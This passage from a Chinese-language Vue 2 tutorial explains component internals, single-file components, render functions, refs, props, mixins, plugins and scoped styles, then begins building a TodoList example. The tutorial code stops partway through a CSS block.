this._init(options);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nvm可以通过原型使用一些特殊的属性和方法（公共的），比如$watch()，其实vc也能使用$watch()。这涉及到一个重要的内置关系，vc的原型继承了vm的原型，稍微直白点的说法是，vc的原型对象可以通过__proto__访问到vm的原型对象。可以看一下Vue.extend的简化源码。\n\n// Vue框架中关于VueComponent构造函数\nVue.extend = function (extendOptions) {\n    // ... 其他逻辑暂时省略\n    // 这里的Super实际上是Vue构造函数\n    var Super = this;\n    // 都走_init，所以vm有的实例属性和方法，vc几乎都有\n    var Sub = function VueComponent(options) {\n        this._init(options);\n    };\n    // 原型式继承，Sub.prototype的__proto__指向了Super.prototype\n    Sub.prototype = Object.create(Super.prototype);\n    // 让原型上的构造函数引用，重新指向Sub\n    Sub.prototype.constructor = Sub;\n    // ... 其他逻辑暂时省略\n    return Sub; // 返回VueComponent构造函数\n};\n// js中关于Object.create()的本质，它返回了一个新对象，新对象的__proto__指向了o\nfunction object(o) {\n    function F() {}     // 定义临时引用类型F的构造函数\n    F.prototype = o;    // 普通函数的入参对象o作为这个临时引用类型F的原型\n    return new F();     // 最后临时引用类型F的实例\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 组件本质是一个名为VueComponent的构造函数，且不是程序员自定义的，是Vue.extend()新生成的函数对象。\n 2. 在模板中使用组件，例如<school></school>，Vue解析时会帮我们创建组件的实例对象（school组件的实例对象）。\n 3. 特别注意：每次调用Vue.extend()，返回的都是一个全新的VueComponent构造函数。\n 4. 关于this的指向：\n    1. 组件配置对象中，methods、watch、computed里定义的方法，它们的this指向均是VueComponent实例(vc)。\n    2. new Vue()配置对象中，methods、watch、computed里定义的方法，它们的this指向均是Vue实例对象(vm)。\n 5. 想要在控制台查看组件的嵌套，可以在vm.$children或者vc.$children进行查看。\n 6. 一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype。让实例组件vc能访问到Vue原型上的属性和方法。\n\n----------------------------------------\n\n\n# 2.6 单文件组件\n\n单文件组件就是一个文件只包含了一个组件。这个单文件，一般存在于Vue脚手架里，Vue脚手架在学习vue的准备工作里介绍安装过。\n\n单文件的命名方式与2.3 组件的几个注意点这节里组件命名方式一样，在脚手架里常使用每个单词首字母大写的方式。单文件的样子就是下面例子Xxx.vue，它只有三种标签<template>组件的模板、<script>脚本、<style>样式，比较方便复用。\n\n<template>\n    \x3c!-- 模板，组件的结构 --\x3e\n</template>\n<script>\n    // 组件交互相关的代码（数据、方法等）\n<\/script>\n<style>\n    /* 组件的样式 */\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n我们将前面几节的例子修改单文件组件形式（可以先将脚手架的src/main.js和public/index.html删除），首先准备School.vue和Student.vue，这两个文件我们放在了一个src/components文件夹下。\n\n<template>\n  <div>\n    <h2>学校：{{ schoolName }}</h2>\n    <h2>地址：{{ schoolAddress }}</h2>\n  </div>\n</template>\n\n<script>\n// 将创建的组件，以模块的方式导出去，Vue.extend()省略了\nexport default {\n  name: "School",\n  data() {\n    return { schoolName: "武汉大学", schoolAddress: "武汉市武昌区珞珈山路" };\n  },\n};\n<\/script>\n\n<style>\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n<template>\n  <div>\n    <h2>学生姓名：{{ name }}</h2>\n    <h2>学生年龄：{{ age }}</h2>\n  </div>\n</template>\n\n<script>\n// 将组件导出去，省略了Vue.extend()的方式\nexport default {\n  name: "Student",\n  data() {\n    return { name: "张三", age: 18 };\n  },\n};\n<\/script>\n\n<style>\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n然后准备一个App.vue，它是一个应用中最大的组件，管理所有的组件，它就放在src目录里。\n\n<template>\n  <div>\n    <School></School>\n    <Student></Student>\n  </div>\n</template>\n\n<script>\nimport School from "./components/School.vue";\nimport Student from "./components/Student.vue";\n\nexport default {\n  name: "App",\n  components: {\n    School,\n    Student,\n  },\n};\n<\/script>\n\n<style>\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n此时vm实例还没有准备，那就新建一个文件main.js，这个main.js是js入口文件，它放在src目录里。\n\nimport Vue from \'vue\'\nimport App from \'./App.vue\'\n\nVue.config.productionTip = false;\n\n/*\n    在脚手架里默认不能使用`template`字段，下一章节会解释。可以在项目根目录新建vue.config.js，\n    并在里面加上`module.exports={runtimeCompiler: true}`，然后重启项目即可消除限制。\n*/ \nnew Vue({\n    el: \'#app\',\n    name: \'App\',\n    template: `<App></App>`,\n    components: {\n        App\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n最后就是准备一个浏览器能识别的html入口文件index.html，它其实是在public目录里。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    \x3c!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面 --\x3e\n    <meta http-equiv="X-UA-Compatible" content="IE=edge">\n    \x3c!-- 开启移动端的理想视口 --\x3e\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>Document</title>\n</head>\n<body>\n    <div id="app"></div>\n    \x3c!-- 在脚手架里，会自动注入这些js，无需手动引入 --\x3e\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    <script src="./main.js"><\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n你可以将上面的几个文件拿到Vue脚手架里对应目录下，稍加修改就可以运行使用了。\n\n\n# 三、组件相关零碎知识\n\n\n# 3.1 解析成虚拟DOM的方式\n\n渲染页面解析成虚拟DOM有三种方式：解析模板标签、使用render函数、解析配置对象的template字段。前两者用得较多，最后一个很少使用了。\n\n * 解析模板标签需要专用的编译器，这个在项目的package.json中可以找到，叫做vue-template-compiler。\n * render函数使用了createElement。\n * 解析template字段也是用了一个编译器（要与模板标签的区分开），在项目中它是默认不开启的。\n\n因为解析template字段的编译功能默认在脚手架项目中不开启，所以在上一章最后一节的main.js里，遇到了问题。问题是得到了解决，在项目的根目录下新建vue.config.js文件，然后在里面写上如下配置（添加webpack有关配置），这样就开启了解析template字段的编译器了。（注意改完重启项目）\n\nmodule.exports = {\n    // 开启Compiler模式，让配置对象可以使用`template`字段\n    runtimeCompiler: true\n}\n\n\n1\n2\n3\n4\n\n\n但是我们不建议开启解析template字段的编译功能，原因是与该编译功能的vue.esm.js比较大，比默认使用的vue.runtime.esm.js**大了30%**的体积。\n\n\n# 3.2 render函数\n\n上一章最后一节的main.js，是可以将template: \'<App></App>\'替换成render()（render函数），这样就无需添加runtimeCompiler有关配置，减小打包后的包体积。\n\n在配置对象中render()是与data()平级的，Vue在渲染时会调用这个render()，并且会传一个xxx参数给render(xxx)。要注意，xxx的实参是Vue提供给我们的一个函数，它是一个用来生成虚拟DOM元素的函数。生成虚拟DOM以后，会return给Vue，Vue会拿这个虚拟DOM去生成真实DOM，完成当前页面或组件的渲染。\n\nxxx形参名可以是createElement也可以是h（自定义名字），使用createElement()时，它的入参可以是原生元素相关，也可以是子组件。\n\nimport Vue from \'vue\'\nimport App from \'./App.vue\'\nVue.config.productionTip = false\nnew Vue({\n  el: \'#app\',\n  /*\n    render函数替代了`template`字段。createElement指向的是一个函数，\n    该函数是由Vue提供的，用来生成虚拟DOM。生成的虚拟DOM最后要return给Vue的。\n    createElement的入参可以是原生元素相关，也可以子组件。createElement\n    这个名是自定义的，也可以是h。\n  */\n  render(createElement) {\n    // 如果使用原生元素，第一个参数是标签名，第二个是标签体\n    // return createElement(\'h1\', \'你好\');\n    // 注册子组件后，在这里使用子组件，然后就可以展示到当前组件里\n    return createElement(App);\n  },\n  // 在当前组件里注册子组件\n  components: {\n    App\n  }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 渲染页面解析成虚拟DOM有三种方式：解析模板标签、使用render函数、解析配置对象的template字段。\n 2. 脚手架项目默认不开启解析template字段的编译功能，因为前两种基本够用，还能减小打包的包体积。\n 3. 如果存js文件（非vue文件）可以使用render函数来渲染组件或页面，render函数的形参指向一个函数。该形参就是具体用于生成虚拟DOM的函数，接收的参数可以是原生元素相关或者子组件。\n\n----------------------------------------\n\n\n# 3.3 ref特殊属性\n\n我们在列表渲染相关章节里介绍过key，它是一个特殊的attribute。这一小节要介绍另外一个特殊的attribute，ref常用来替代id，用于获取真实DOM元素或者子组件的实例。在模板中使用ref="xxx"来给原生元素或子组件进行注册引用信息，然后在某个方法中使用this.$refs.sch来获取对应的真实DOM或子组件实例。\n\n<template>\n  <div>\n    \x3c!-- 使用的id，获取时使用document.getElementById --\x3e\n    \x3c!-- <h2 id="sch">学校：{{ schoolName }}</h2> --\x3e\n    \x3c!-- 使用的ref，获取时使用this.$refs.xxx --\x3e\n    <h2 ref="sch">学校：{{ schoolName }}</h2>\n    <h2>地址：{{ schoolAddress }}</h2>\n    <button @click="getEl">点击获取学校名的元素</button>\n    \x3c!-- 在子组件上使用ref，获取时this.$refs.xxx，得到的是子组件的实例对象 --\x3e\n    <Student ref="stud"></Student>\n  </div>\n</template>\n\n<script>\nimport Student from "./Student.vue";\nexport default {\n  name: "School",\n  components: {\n    Student,\n  },\n  data() {\n    return { schoolName: "武汉大学", schoolAddress: "武汉市武昌区珞珈山路" };\n  },\n  methods: {\n    getEl() {\n      // 返回的是学校名有关的那个h2元素\n      console.log("通过ref获取的元素1：", this.$refs.sch);\n      // 返回的是Student组件的实例\n      console.log("通过ref获取的元素2：", this.$refs.stud);\n    },\n  },\n};\n<\/script>\n\n<style>\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n\n# 3.4 props数据流向\n\n在父组件中调用子组件，有时候需要传递给子组件一些初始化数据，子组件拿这些数据进行渲染。\n\n我们使用props方式传参：在子组件被调用时的标签里（编写标签时），把传参作为该标签的属性；那么对应的，在子组件内部要使用props配置项进行参数的接收。如下代码，我们将School作为Student的父组件，在子组件被调用处的<Student>标签里加上name和age属性形式的传参，子组件Student内部使用props: ["name", "age"]配置项进行接收。\n\n父组件School.vue：\n\n<template>\n  <div>\n    <h2>学校：{{ schoolName }}</h2>\n    <h2>地址：{{ schoolAddress }}</h2>\n    <Student name="张三" :age="18"></Student>\n    <Student name="李四" :age="20"></Student>\n  </div>\n</template>\n\n<script>\nimport Student from "./Student.vue";\nexport default {\n  name: "School",\n  components: {\n    Student,\n  },\n  data() {\n    return { schoolName: "武汉大学", schoolAddress: "武汉市武昌区珞珈山路" };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n子组件Student.vue：\n\n<template>\n  <div>\n    <h1>{{ msg }}</h1>\n    <h2>学生姓名：{{ name }}</h2>\n    <h2>学生年龄：{{ age }}</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Student",\n  // 使用字符串数组来接收父组件传来的数据\n  props: ["name", "age"],\n  data() {\n    return { msg: "我是一个学生" };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n * 在使用props方式进行传参有几个注意点：\n   \n   1. 如果传参数据是静态字符串，就直接使用属性；如果是动态的或者非字符串，那就使用v-bind进行动态绑定（js表达式）。\n   \n   2. 如果你想将一个对象的所有属性都传过去，那使用v-bind="obj"，子组件内部使用对象属性名来接收；如果是将整个对象传过去就v-bind:param="obj"，子组件内部使用一个对象比如param来接收。\n      \n      // 将某个对象的所有属性通过props方式传过去\n      post: { id: 1, title: \'My Journey with Vue\'}\n      // 父组件模板里编写子组件标签，添上v-bind="post"\n      <blog-post v-bind="post"></blog-post>\n      // 与上面的写法效果完全一样，这个写法更麻烦\n      <blog-post\n        v-bind:id="post.id"\n        v-bind:title="post.title"\n      ></blog-post>\n      // 接收时就使用属性名来接收\n      props: [\'id\', \'title\']\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      9\n      10\n      11\n      \n   \n   3. 子组件内部的props配置项是与data和methods是平级的，props配置项用得最多的形式是字符串数组，Vue初始化时会对这个数组进行解析，并将数组里解析好的字段放到this上（组件实例），也就是可以通过this直接访问这些字段（先于data解析）。\n\n * 另外，我们必须记住父子组件间的props是由父到子的单向数据流动（父通过props传数据给子，但子不能修改props）：\n   \n   1. 父组件里的data数据变化时，会引起父组件模板重新解析。如果父组件模板里的子组件使用了props方式传参，并且这个参数跟着父组件的data变化了，那么子组件内部的props配置项也会变化，子组件的模板也会重新解析。如果只是单纯的props方式传参，但是这个参数并没有随着父组件data的变化而变化，那子组件的props配置项以及模板都不会有变化，这一点非常重要！！！不是父组件变动了子组件就一定会变，只有props数据变了才会重新解析子组件的模板。\n   2. 子组件内部自己对props配置项进行修改，并不会引发父组件的数据以及模板的变化。如果要在子组件内部修改props应该怎么办？正确做法是使用data的变量转存一份props（用computed的变量来转存也可以），但是不能同名，控制台会报错；即使同名，也只会生效props的，这意味着props的解析先于data（data的同名并不会覆盖props里的）。要记住，props配置项是只读的，你不能修改它，否则会报错！\n   3. 但是有一个漏洞，如果props传过来的是一个完整的对象时（不是v-bind="obj"而是v-bind:param="obj"），直接修改对象的引用会报错（相当于重新赋一个新对象给引用，所以会报错），去修改对象上的某个属性就能修改成功的。不过不建议这么做！\n\n<template>\n  <div>\n    <h1>{{ msg }}</h1>\n    <h2>学生姓名：{{ name }}</h2>\n    <h2>学生年龄：{{ myAge }}</h2>\n    \x3c!-- 不要妄想直接修改age，props是只读数据，这种数据流是单向的 --\x3e\n    <button @click="myAge++">我想改一下年龄</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Student",\n  // 使用字符串数组来接收父组件传来的数据\n  props: ["name", "age"],\n  data() {\n    // 想改props里的age数据，那就使用data里的变量进行转存，但不能同名\n    // props先于data解析，所以这里能访问this.age也就是props里的age\n    return { msg: "我是一个学生", myAge: this.age };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nprops还有另外两种写法，是为了对props进行验证，用的比较少。一种方式是只限制数据类型，另一种方式是限制数据类型、限制必要性、指定默认值。\n\n<template>\n  <div>\n    <h1>{{ msg }}</h1>\n    <h2>学生姓名：{{ name }}</h2>\n    <h2>学生年龄：{{ age }}</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Student",\n  // 限制属性的类型\n  /* props: {\n    name: String,\n    age: Number,\n  }, */\n  // 限制类型、限制必要性、指定默认值。只有在非必要时才指定默认值。\n  props: {\n    name: {\n      type: String,\n      require: true, // 必要的\n    },\n    age: {\n      type: Number,\n      require: false, // 非必要的，父组件那里就可以不用传了\n      default: 50, // 默认值，如果父组件那里没有传就是用默认值\n    },\n  },\n  data() {\n    return { msg: "我是一个学生" };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. props配置项：让组件接收外部传来的数据。\n 2. 三种写法：\n    1. props: [\'name\', \'age\']只用于接收；\n    2. props: { name: String, age: Number }，接收并限制类型；\n    3. props: { age: { type: Number, require: false, default: 50 }}，接收并限制类型、限制必要性、指定默认值。\n 3. 父组件到子组件的props是单向的数据流动。\n    1. 父组件的data变化，会让父组件模板重新解析，然后子组件的props数据如果随着父组件data变化了，那子组件的模板也会重新解析，否则就算用了props方式传值，只要props数据不变就不会让子组件模板重新解析。\n    2. 子组件里的props配置项是只读的，修改就会报错。若想要修改props配置项里的数据，请将props数据复制到data里（computed也可），但不能同名。\n    3. 其实还能总结一条：子组件重新渲染只依赖于data和props的变化。\n\n----------------------------------------\n\n\n# 3.5 mixin混入\n\n在使用不同组件时，你可能会遇到他们的某些配置（data、methods等）是完全相同的或者一部分相同），这其实是可以进行代码复用的，Vue给我们提供了配置共用的功能——mixin混入。\n\n首先是将共用的配置提取到一个单独的js文件里，这个js文件用于存放混入对象*，混入对象的各个属性就是共用的data、methods、mounted等，最后export出去。然后在组件里使用，先将混入对象import进来，再将混入对象里存的共用配置与组件本地的配置进行混合或者说合并，具体会涉及到一个新配置项mixins: [xxx]（数组形式），xxx就是混入对象。\n\n注意不是data整体覆盖了data（也不是methods覆盖了methods），是data中的属性进行合并（是methods中的方法进行合并），当然，不止是data、methods，还有computed、watch等。\n\n比如下面这个例子，我们将School和Student调成平级的，并让他们的methods配置一样。我们在components目录下新建一个mixin.js（名字自定义），在这里放的是被复用的配置（代码完全相同）。\n\n// 分别导出 混入对象m1\nexport const m1 = {\n    // School和Student的methods配置一样，所以被单独抽到这里\n    methods: {\n        showName() { alert(this.name); },\n    },\n}\n// 分别导出 混入对象m2\nexport const m2 = { // ... }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nSchool.vue：\n\n<template>\n  <div>\n    <h2 @click="showName">学校：{{ name }}</h2>\n    <h2 @click="showMsg">地址：{{ address }}</h2>\n  </div>\n</template>\n\n<script>\n// 导入混入对象m1\nimport { m1 } from "./mixin";\nexport default {\n  name: "School",\n  data() {\n    return { name: "武汉大学", address: "武汉市武昌区珞珈山路" };\n  },\n  // 使用mixins配置项，将公用的methods和组件本地的methods混在一起\n  mixins: [m1],\n  methods: {\n    // 与Student的showMsg代码不一样，所以它不能提取到mixin.js\n    showMsg() { alert(this.address); },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nStudent.vue：\n\n<template>\n  <div>\n    <h2 @click="showName">学生姓名：{{ name }}</h2>\n    <h2 @click="showMsg">学生年龄：{{ age }}</h2>\n  </div>\n</template>\n\n<script>\n// 导入混入对象m1\nimport { m1 } from "./mixin";\nexport default {\n  name: "Student",\n  data() {\n    return { name: "张三", age: 20 };\n  },\n  // 使用mixins配置项，将公用的methods和组件本地的methods混在一起\n  mixins: [m1],\n  methods: {\n    // 与School的showMsg代码不一样，所以它不能提取到mixin.js\n    showMsg() { alert(this.age); },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n像data、methods等配置项，如果混合对象与组件本地有同名的属性或方法，那么合并的时候以组件本地为主。而mounted这种生命周期钩子被提取到混合对象里，并且组件本地也写了mounted生命钩子，那两个地方的生命周期都会运行（mixin运行一遍，组件本地运行一遍），并不像data、methods等的合并。\n\n----------------------------------------\n\n总结拓展：\n\n 1. mixin混入：可以把多个组件共用的配置提取成一个混入对象。\n 2. 使用方法：\n    1. 定义混入对象：const m1 = {methods: {}}。\n    2. 使用混入对象：在配置对象中加入mixins: [m1]，前提是import导入进来了。\n 3. 以上是局部混入，其实也能全局混入，使用得很少。全局混入定义时Vue.mixin(xxx)，会给每个vc以及vm混入配置。全局混入在使用时不再需要mixins:[m1, m2]配置项了。\n\n----------------------------------------\n\n\n# 3.6 插件\n\n插件是用于增强Vue的功能，比如过滤器、自定义指令、mixin混入都可以放到Vue上进行全局使用。\n\n插件是定义在一个单独的js里，它具有一个重要的方法叫做install，在这个方法中进行过滤器、自定义指令、minxin混入等全局注册。install(Vue, a, b, c)的第一个入参就是Vue构造函数，后面的入参是使用处Vue.use(plugins, a, b c)中出传的a、b、c。\n\n新建一个plugins.js：\n\n// 定义一个插件\nexport default {\n    install(Vue) {\n        // 全局配置\n        Vue.config.productionTip = false\n        // 全局过滤器\n        Vue.filter(\'addStr\', function (value) {\n            return value + \'测试结果成功\';\n        });\n        // 全局自定义指令\n        Vue.directive(\'big\', function (element, binding) {\n            element.innerText = binding.value + \'测试结果成功\';\n        });\n        // 全局mixin混入\n        Vue.mixin({\n            data() {\n                return {\n                    test1: \'测试全局过滤器：\',\n                    test2: \'测试全局自定义指令：\'\n                }\n            },\n            methods: {\n                showName() {\n                    alert(this.name);\n                }\n            },\n        });\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n在main.js中使用插件：\n\nimport Vue from \'vue\'\nimport App from \'./App.vue\'\nimport plugins from \'./plugins\'\n\n// 使用插件\nVue.use(plugins);\n\nnew Vue({\n  el: \'#app\',\n  render: h => h(App),\n  components: { App }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n在School.vue中使用全局过滤器、全局自定义指令、全局混入：\n\n<template>\n  <div>\n    \x3c!-- showName是全局混入的一个方法，name是组件本地data中的数据 --\x3e\n    <h2 @click="showName">学校：{{ name }}</h2>\n    \x3c!-- address是组件本地data数据 --\x3e\n    <h2>地址：{{ address }}</h2>\n    \x3c!-- test1是全局混入的data数据，addStr是全局过滤器 --\x3e\n    <h2>{{ test1 | addStr }}</h2>\n    \x3c!-- test2是全局混入的data数据，v-big是全局自定义指令 --\x3e\n    <h2 v-big="test2"></h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "School",\n  data() {\n    return { name: "武汉大学", address: "武汉市武昌区珞珈山路" };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n在Student.vue中使用全局过滤器、全局自定义指令、全局混入：\n\n<template>\n  <div>\n    \x3c!-- showName是全局混入的一个方法，name是组件本地data中的数据 --\x3e\n    <h2 @click="showName">学生姓名：{{ name }}</h2>\n    \x3c!-- age是组件本地data数据 --\x3e\n    <h2>学生年龄：{{ age }}</h2>\n    \x3c!-- test1是全局混入的data数据，addStr是全局过滤器 --\x3e\n    <h2>测试全局过滤器：{{ test1 | addStr }}</h2>\n    \x3c!-- test2是全局混入的data数据，v-big是全局自定义指令 --\x3e\n    <h2 v-big="test2"></h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Student",\n  data() {\n    return { name: "张三", age: 20 };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 插件功能：用于增强Vue。\n 2. 插件本质：包含install方法的一个对象，install第一个参数是Vue，之后的参数是插件使用者传入的。\n 3. 定义插件：对象.install = function(Vue, a, b, c) {}，install方法中加Vue.filter(...)、Vue.directive()等。\n 4. 使用插件：Vue.use(对象, a, b, c)，这个对象就是上面那个“对象”，abc是多余可以自己传的参数。\n\n----------------------------------------\n\n\n# 3.7 scoped样式\n\n两个平级的组件，在使用样式的时候，遇到同名class，它们class对应的样式各不相同，但是只生效后引用的同名class样式。Vue其实给我们解决了不同组件的同名class样式冲突的问题，只需要在将scoped加到<style>上就可以解决，即<style scoped></style>。\n\n需要注意的是App.vue里经常加公用样式，所以App.vue的<style>里很少加上scoped。\n\nSchool.vue：\n\n<template>\n  <div class="test">\n    <h2 class="title">学校：{{ name }}</h2>\n    <h2>地址：{{ address }}</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "School",\n  data() {\n    return { name: "武汉大学", address: "武汉市武昌区珞珈山路" };\n  },\n};\n<\/script>\n\x3c!-- 加上scoped解决class同名问题 --\x3e\n<style scoped>\n.test { background-color: blue; }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nStudent.vue：\n\n<template>\n  <div class="test">\n    <h2 class="title">学生姓名：{{ name }}</h2>\n    <h2>学生年龄：{{ age }}</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Student",\n  data() {\n    return { name: "张三", age: 20 };\n  },\n};\n<\/script>\n\x3c!-- 加上scoped解决class同名问题 --\x3e\n<style scoped>\n.test { background-color: green; }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nmain.js：\n\nimport Vue from \'vue\'\nimport App from \'./App.vue\'\n\nnew Vue({\n  el: \'#app\',\n  render: h => h(App),\n  components: { App }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 四、TodoList案例\n\n\n# 4.1 将页面拆分成组件\n\n\n\nTodoList静态图如下，这一节是将TodoList拆分成一个个组件，要注意的是按照功能点来拆分。将顶部的输入框作为AddTodo组件，将中间的Todo展示列表作为TodoMain组件，将底部的删除、清空等按钮取作为TotalTodo组件；TodoMain组件是可以进一步拆分成一个个TodoItem组件的。最后将AddTodo、TodoMain、TotalTodo放入App.vue里。\n\n\n\n容器App.vue：\n\n<template>\n  <div class="todo-container">\n    <AddTodo></AddTodo>\n    <TodoMain></TodoMain>\n    <TotalTodo></TotalTodo>\n  </div>\n</template>\n\n<script>\nimport AddTodo from "./components/AddTodo.vue";\nimport TodoMain from "./components/TodoMain.vue";\nimport TotalTodo from "./components/TotalTodo.vue";\n\nexport default {\n  name: "App",\n  components: {\n    AddTodo,\n    TodoMain,\n    TotalTodo,\n  },\n};\n<\/script>\n\n<style>\n/*base*/\nbody {\n  background: #fff;\n}\n.btn {\n  display: inline-block;\n  padding: 4px 12px;\n  margin-bottom: 0;\n  font-size: 14px;\n  line-height: 20px;\n  text-align: center;\n  vertical-align: middle;\n  cursor: pointer;\n  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),\n    0 1px 2px rgba(0, 0, 0, 0.05);\n  border-radius: 4px;\n}\n.btn-danger {\n  color: #fff;\n  background-color: #da4f49;\n  border: 1px solid #bd362f;\n}\n.btn-danger:hover {\n  color: #fff;\n  background-color: #bd362f;\n}\n.btn:focus {\n  outline: none;\n}\n.todo-container {\n  width: 600px;\n  margin: 0 auto;\n}\n.todo-container .todo-wrap {\n  padding: 10px;\n  border: 1px solid #ddd;\n  border-radius: 5px;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\n顶部的输入框AddTodo.vue：\n\n<template>\n  <div class="todo-header">\n    <input type="text" placeholder="请输入你的任务名称，按回车键确认" />\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "AddTodo",\n};\n<\/script>\n\n<style scoped>\n/*header*/\n.todo-header input {\n  width: 585px;\n  height: 28px;\n  font-size: 14px;\n  border: 1px solid #ccc;\n  border-radius: 4px;\n  padding: 4px 7px;\n}\n.todo-header input:focus {\n  outline: none;\n  border-color: rgba(82, 168, 236, 0.8);\n  box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),\n    0 0 8px rgba(82, 168, 236, 0.6);\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n中间的Todo展示区域TodoMain.vue：\n\n<template>\n  <ul class="todo-main">\n    <TodoItem></TodoItem>\n    <TodoItem></TodoItem>\n    <TodoItem></TodoItem>\n  </ul>\n</template>\n\n<script>\nimport TodoItem from "./TodoItem.vue";\nexport default {\n  name: "TodoMain",\n  components: { TodoItem },\n};\n<\/script>\n\n<style scoped>\n/*main*/\n.todo-main {\n  margin-left: 0px;\n  border: 1px solid #ddd;\n  border-radius: 2px;\n  padding: 0px;\n}\n.todo-empty {\n  height: 40px;\n  line-height: 40px;\n  border: 1px solid #ddd;\n  border-radius: 2px;\n  padding-left: 5px;\n  margin-top: 10px;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n底部的删除清空按钮区域TotalTodo.vue：\n\n<template>\n  <div class="todo-footer">\n    <label>\n      <input type="checkbox" />\n    </label>\n    <span> <span>已完成0</span> / 全部2 </span>\n    <button class="btn btn-danger">清除已完成任务</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "TotalTodo",\n};\n<\/script>\n\n<style scoped>\n/*footer*/\n.todo-footer {\n  height: 40px;\n  line-height: 40px;\n  padding-left: 6px;\n  margin-top: 5px;\n}\n.todo-footer label {\n  display: inline-block;\n  margin-right: 20px;\n  cursor: pointer;\n}\n.todo-footer label input {\n  position: relative;\n  top: -1px;\n  vertical-align: middle;\n  margin-right: 5px;\n}\n.todo-footer button {\n  float: right;\n  